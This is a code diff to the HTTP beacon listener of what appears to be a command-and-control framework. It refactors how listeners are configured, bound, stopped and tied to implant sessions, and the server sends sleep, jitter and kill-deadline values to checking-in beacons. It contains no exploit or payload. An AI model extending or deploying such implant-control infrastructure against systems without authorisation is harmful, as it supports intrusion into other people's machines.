@@ -73,33 +73,52 @@ class BeaconListener(Transport):
 
     name = 'http'
 
-    def __init__(self, engine, host: str, port: int,
-                 certfile: str, keyfile: str,
+    def __init__(self, engine, host: str = None, port: int = None,
+                 certfile: str = None, keyfile: str = None,
                  client_ca: str = None,
                  extra_paths: dict = None,
                  c2_profile_dir: str = None,
-                 profile_filter: str = None):
-        """client_ca:       if set, the listener requires a client
-                         certificate signed by this CA. Mutual TLS.
-                         If None, server-only TLS.
+                 profile_filter: str = None,
+                 profiles: list = None,
+                 listener_id: str = None,
+                 config: dict = None):
+        """Two ways to construct:
 
-        extra_paths:     optional dict mapping {"beacon": ..., "tasks":
-                         ..., "results": ...} to URLs. Additional to the
-                         auto-discovered profile paths. Kept for tests
-                         and for callers that want to inject paths
-                         without touching the filesystem.
+          * Legacy positional — pass host/port/certfile/keyfile
+            individually. Used only by tests and one-off scripts.
+          * Manager path — pass `config=<dict from listeners.json>`.
+            The manager always uses this form. It carries the tls
+            block, the profiles list, and the listener's stable id.
 
-        c2_profile_dir:  directory to scan for C2 profile JSON files.
-                         Defaults to the same location the builder
-                         uses, so the two sides always agree.
+        `config` keys consumed here:
+            host, port
+            tls: {mode, cert_path, key_path, ca_path}
+            profiles: list of C2 profile names, or None for all
+            c2_profile_dir: optional override
+            extra_paths: optional dict (tests only)
+            listener_id: stable identifier from the manager
 
-        profile_filter:  optional name (without .json). When set, only
-                         that profile's paths are registered. When None
-                         (the default), every profile in the directory
-                         is scanned — an agent built with any profile
-                         can check in against a listener that was
-                         started without a matching flag.
+        `profile_filter` (single name) is kept for compatibility —
+        it is folded into `profiles` at the end of __init__.
         """
+        if config is not None:
+            host = config.get('host')
+            port = int(config.get('port', 0))
+            tls = config.get('tls') or {}
+            certfile = certfile or tls.get('cert_path')
+            keyfile = keyfile or tls.get('key_path')
+            if client_ca is None and (
+                    (tls.get('mode') or '').lower() == 'mtls'):
+                client_ca = tls.get('ca_path')
+            if profiles is None:
+                profiles = config.get('profiles')
+            if c2_profile_dir is None:
+                c2_profile_dir = config.get('c2_profile_dir')
+            if extra_paths is None:
+                extra_paths = config.get('extra_paths')
+            if listener_id is None:
+                listener_id = config.get('id')
+
         super().__init__(engine, host, port, config={
             'certfile': certfile, 'keyfile': keyfile,
             'client_ca': client_ca,
@@ -109,6 +128,7 @@ class BeaconListener(Transport):
         self.keyfile = keyfile
         self.client_ca = client_ca
         self.extra_paths = extra_paths or {}
+        self.listener_id = listener_id
         self.profile = {
             'beacon_path':  '/beacon',
             'tasks_path':   '/tasks',
@@ -122,7 +142,23 @@ class BeaconListener(Transport):
             except Exception:
                 c2_profile_dir = None
         self.c2_profile_dir = c2_profile_dir
+
+        # Normalize the profile selection. A listener carries either
+        # a list of profile names (filter to those) or None (serve
+        # every profile in the directory). The old single-name
+        # `profile_filter` folds into the list form.
+        if profiles is None and profile_filter:
+            profiles = [profile_filter]
+        if profiles is not None:
+            profiles = [
+                p[:-5] if isinstance(p, str) and p.endswith('.json')
+                else p for p in profiles if p]
+        self.profiles = profiles
+        # Kept for the two discovery helpers below that historically
+        # consulted `self.profile_filter`.
         self.profile_filter = profile_filter
+        self._server = None
+        self._last_error = None
         self._status_codes = {
             'beacon':  200,
             'tasks':   200,
@@ -188,7 +224,8 @@ class BeaconListener(Transport):
 
         return presenting_sid
 
-    def _build_path_shapes(self, directory, profile_filter):
+    def _build_path_shapes(self, directory, profile_filter=None,
+                           profiles=None):
         """Build a per-path mapping for the listener.
 
         Returns {path: entry} where entry is a dict with:
@@ -212,10 +249,11 @@ class BeaconListener(Transport):
         if not directory or not _os.path.isdir(directory):
             return {}
 
-        if profile_filter:
-            stem = profile_filter[:-5] if profile_filter.endswith(
-                '.json') else profile_filter
-            names = [stem + '.json']
+        _sel = profiles if profiles is not None else self.profiles
+        if _sel is not None:
+            stems = {p[:-5] if p.endswith('.json') else p
+                     for p in _sel}
+            names = sorted(s + '.json' for s in stems)
         else:
             try:
                 names = sorted(
@@ -464,11 +502,10 @@ class BeaconListener(Transport):
         if not directory or not _os.path.isdir(directory):
             return result
 
-        if self.profile_filter:
-            stem = self.profile_filter[:-5] \
-                   if self.profile_filter.endswith('.json') \
-                   else self.profile_filter
-            names = [stem + '.json']
+        if self.profiles is not None:
+            stems = {p[:-5] if p.endswith('.json') else p
+                     for p in self.profiles}
+            names = sorted(s + '.json' for s in stems)
         else:
             try:
                 names = [e for e in _os.listdir(directory)
@@ -694,6 +731,8 @@ class BeaconListener(Transport):
             session = self.engine.get(reply.get('id'))
             if session is not None:
                 session.transport = 'http'
+                if self.listener_id:
+                    session.listener_id = self.listener_id
         except Exception:
             pass
 
@@ -780,6 +819,8 @@ class BeaconListener(Transport):
 
         session = self.engine.get(sid)
         if session is not None:
+            if self.listener_id:
+                session.listener_id = self.listener_id
             resp.headers['X-Beacon-Sleep'] = str(session.sleep_interval)
             resp.headers['X-Beacon-Jitter'] = f"{session.jitter:.4f}"
             if session.kill_deadline:
@@ -927,28 +968,152 @@ class BeaconListener(Transport):
     # Lifecycle
 
     def start(self) -> bool:
+        """Bind the socket and begin serving.
+
+        The bind happens *here*, not inside the serving thread, so
+        a port conflict or permission error returns False to the
+        caller (the listener manager) instead of a silent thread
+        death three seconds later. The manager uses this return
+        value to mark the listener as status='error' and report
+        the reason to the operator.
+        """
+        if self._running:
+            return True
         ctx = self._make_tls_context()
         if ctx is None:
+            self._last_error = 'TLS context setup failed'
             return False
+        try:
+            from werkzeug.serving import make_server
+        except ImportError:
+            self._last_error = 'werkzeug not installed'
+            log.error("beacon: werkzeug not installed "
+                      "(pip install flask)")
+            return False
+
+        kwargs = {'ssl_context': ctx, 'threaded': True}
+        if QuietWSGIRequestHandler is not None:
+            kwargs['request_handler'] = QuietWSGIRequestHandler
+
+        _inner = self._app
+
+        def _rate_limited(environ, start_response):
+            peer = environ.get('REMOTE_ADDR', '?')
+            now = time.monotonic()
+            with _HANDSHAKE_LOCK:
+                tokens, last = _HANDSHAKE_STATE.get(
+                    peer, (_HANDSHAKE_BURST, now))
+                refill = (now - last) * _HANDSHAKE_RATE
+                tokens = min(_HANDSHAKE_BURST, tokens + refill)
+                if tokens < 1.0:
+                    _HANDSHAKE_STATE[peer] = (tokens, now)
+                    start_response(
+                        '429 Too Many Requests',
+                        [('Content-Type', 'text/plain'),
+                         ('Retry-After', '5')])
+                    return [b'rate limited\n']
+                _HANDSHAKE_STATE[peer] = (tokens - 1.0, now)
+            return _inner(environ, start_response)
+
+        try:
+            srv = make_server(
+                self.host, self.port, _rate_limited, **kwargs)
+        except OSError as exc:
+            self._last_error = (
+                f'bind {self.host}:{self.port} failed: {exc}')
+            log.error("beacon: %s", self._last_error)
+            return False
+        except Exception as exc:
+            self._last_error = (
+                f'make_server {self.host}:{self.port} failed: {exc}')
+            log.error("beacon: %s", self._last_error)
+            return False
+
+        self._server = srv
         self._pruner_stop.clear()
+        self._pruner = threading.Thread(
+            target=self._prune_loop, daemon=True)
+        self._pruner.start()
         self._thread = threading.Thread(
-            target=self._run, args=(ctx,), daemon=True,
-        )
+            target=self._serve, args=(srv,), daemon=True)
         self._running = True
         self._thread.start()
+        self._last_error = None
         return True
 
     def stop(self) -> None:
+        """Stop serving and release the port.
+
+        Werkzeug's BaseWSGIServer exposes shutdown() and
+        server_close() — the module docstring's claim that it does
+        not is wrong. Calling both here lets the operator stop a
+        listener and rebind the same port on a new listener without
+        restarting the process. Without this, the daemon thread
+        keeps the socket bound for the process lifetime.
+        """
         self._running = False
         self._pruner_stop.set()
         if self._pruner is not None:
             self._pruner.join(timeout=2.0)
             self._pruner = None
+        srv = self._server
+        if srv is not None:
+            try:
+                srv.shutdown()
+            except Exception:
+                pass
+            try:
+                srv.server_close()
+            except Exception:
+                pass
+            self._server = None
+        if self._thread is not None:
+            self._thread.join(timeout=5.0)
+            self._thread = None
+
+    def _serve(self, srv) -> None:
+        try:
+            log.info("beacon: listening on %s:%d",
+                     self.host, self.port)
+            srv.serve_forever()
+        except Exception as exc:
+            log.error("beacon: listener died: %s", exc)
+        finally:
+            self._running = False
+            self._server = None
+
+    def _prune_loop(self) -> None:
+        while not self._pruner_stop.wait(120):
+            cutoff = time.monotonic() - 600
+            with _HANDSHAKE_LOCK:
+                stale = [k for k, (_, last) in
+                         _HANDSHAKE_STATE.items()
+                         if last < cutoff]
+                for k in stale:
+                    _HANDSHAKE_STATE.pop(k, None)
+
+    def _tls_material(self):
+        """Return (cert, key), falling back to the handler defaults.
+
+        A listener created with ``tls.mode = none`` still needs a
+        certificate for HTTP/QUIC (both are TLS-only on the wire).
+        The handler's bootstrap cert is the sane fallback.
+        """
+        cert, key = self.certfile, self.keyfile
+        if not cert or not key:
+            handler = getattr(self.engine, 'handler', None)
+            cert = cert or getattr(handler, 'certfile', None)
+            key = key or getattr(handler, 'keyfile', None)
+        return cert, key
 
     def _make_tls_context(self) -> Optional[ssl.SSLContext]:
+        cert, key = self._tls_material()
+        if not cert or not key:
+            self._last_error = 'no certificate material for TLS'
+            return None
         try:
             ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-            ctx.load_cert_chain(self.certfile, self.keyfile)
+            ctx.load_cert_chain(cert, key)
             ctx.set_alpn_protocols(['http/1.1'])
             ctx.minimum_version = ssl.TLSVersion.TLSv1_2
 
@@ -984,61 +1149,3 @@ class BeaconListener(Transport):
         except Exception as exc:
             log.error("beacon: TLS context setup failed: %s", exc)
             return None
-
-    def _run(self, ctx: ssl.SSLContext) -> None:
-        try:
-            from werkzeug.serving import make_server
-        except ImportError:
-            log.error("beacon: werkzeug not installed "
-                      "(pip install flask)")
-            return
-        try:
-            kwargs = {
-                'ssl_context': ctx,
-                'threaded': True,
-            }
-            if QuietWSGIRequestHandler is not None:
-                kwargs['request_handler'] = QuietWSGIRequestHandler
-
-            _inner = self._app
-
-            def _rate_limited(environ, start_response):
-                peer = environ.get('REMOTE_ADDR', '?')
-                now = time.monotonic()
-                with _HANDSHAKE_LOCK:
-                    tokens, last = _HANDSHAKE_STATE.get(
-                        peer, (_HANDSHAKE_BURST, now))
-                    refill = (now - last) * _HANDSHAKE_RATE
-                    tokens = min(_HANDSHAKE_BURST, tokens + refill)
-                    if tokens < 1.0:
-                        _HANDSHAKE_STATE[peer] = (tokens, now)
-                        start_response(
-                            '429 Too Many Requests',
-                            [('Content-Type', 'text/plain'),
-                             ('Retry-After', '5')])
-                        return [b'rate limited\n']
-                    _HANDSHAKE_STATE[peer] = (tokens - 1.0, now)
-                return _inner(environ, start_response)
-
-            import threading as _threading
-
-            def _prune_loop():
-                while not self._pruner_stop.wait(120):
-                    cutoff = time.monotonic() - 600
-                    with _HANDSHAKE_LOCK:
-                        stale = [k for k, (_, last) in
-                                 _HANDSHAKE_STATE.items()
-                                 if last < cutoff]
-                        for k in stale:
-                            _HANDSHAKE_STATE.pop(k, None)
-
-            self._pruner = _threading.Thread(
-                target=_prune_loop, daemon=True)
-            self._pruner.start()
-
-            srv = make_server(
-                self.host, self.port, _rate_limited, **kwargs)
-            log.info("beacon: listening on %s:%d", self.host, self.port)
-            srv.serve_forever()
-        except Exception as exc:
-            log.error("beacon: listener died: %s", exc)
